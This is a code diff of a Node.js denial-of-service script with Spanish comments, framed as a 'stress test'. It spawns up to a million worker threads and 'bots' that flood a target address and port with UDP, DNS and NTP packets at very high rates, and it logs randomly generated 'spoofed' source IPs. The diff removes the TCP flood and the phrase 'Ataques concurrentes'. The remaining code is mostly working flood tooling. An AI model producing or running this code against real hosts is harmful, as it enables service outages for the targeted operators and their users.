@@ -1,6 +1,5 @@
 const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
 const dgram = require('dgram');
-const net = require('net');
 
 if (isMainThread) {
     // Código principal
@@ -10,7 +9,7 @@ if (isMainThread) {
     const numBots = parseInt(args[2], 10) || 1000000; // Número de bots
     const pps = parseInt(args[3], 10) || 1000000; // Paquetes por segundo por bot
     const duration = parseInt(args[4], 10) || 1000000; // Duración en segundos (hasta 1M de segundos)
-    const numThreads = parseInt(args[5], 10) || 1000000; // Número de hilos (hasta 1M de hilos) (Ataques concurrentes)
+    const numThreads = parseInt(args[5], 10) || 1000000; // Número de hilos (hasta 1M de hilos)
 
     for (let i = 0; i < numThreads; i++) {
         new Worker(__filename, {
@@ -18,10 +17,9 @@ if (isMainThread) {
         });
     }
 } else {
-    // Código Worker
+    // Código del trabajador
     const { serverAddress, serverPort, numBots, pps, duration } = workerData;
     const udpClient = dgram.createSocket('udp4');
-    const tcpClient = new net.Socket();
 
     function getRandomIp() {
         return `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`;
@@ -36,18 +34,6 @@ if (isMainThread) {
             } else {
                 console.log(`Bot ${botId}: Enviando paquete UDP ${packetId} desde ${spoofedIp} a ${serverAddress}:${serverPort}`);
             }
-        });
-    }
-
-    function sendTcpPacket(botId, packetId) {
-        const spoofedIp = getRandomIp();
-        const message = `Bot ${botId} - Paquete TCP ${packetId} desde ${spoofedIp}`;
-        tcpClient.connect(serverPort, serverAddress, () => {
-            tcpClient.write(message);
-            console.log(`Bot ${botId}: Enviando paquete TCP ${packetId} desde ${spoofedIp} a ${serverAddress}:${serverPort}`);
-        });
-        tcpClient.on('error', (err) => {
-            console.error(`Bot ${botId}: Error al enviar paquete TCP ${packetId} - ${err.message}`);
         });
     }
 
@@ -97,7 +83,6 @@ if (isMainThread) {
         let packetId = 0;
         const interval = setInterval(() => {
             sendUdpPacket(botId, packetId);
-            sendTcpPacket(botId, packetId);
             sendDnsPacket(botId, packetId);
             sendNtpPacket(botId, packetId);
             packetId++;
@@ -107,11 +92,10 @@ if (isMainThread) {
             clearInterval(interval);
             if (botId === numBots - 1) {
                 udpClient.close();
-                tcpClient.destroy();
                 console.log("Prueba de estrés completada.");
             }
         }, duration * 1000);
     }
 
     setInterval(checkServerStatus, 10000); // Verifica el estado del servidor cada 10 segundos
-}
+            }
